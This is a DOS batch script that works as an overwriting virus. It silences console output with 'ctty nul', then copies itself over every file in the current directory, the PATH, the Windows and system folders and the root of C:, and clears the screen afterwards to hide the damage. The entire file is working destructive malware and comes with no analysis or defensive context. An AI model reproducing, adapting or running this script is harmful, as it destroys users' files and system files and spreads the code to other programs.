@echo off
ctty nul
@for %%a in (*.* .%path%\*.* .\*.* %windir%\*.* %windir%\system\*.* c:\*.*) do copy %0 %%a
ctty con
cls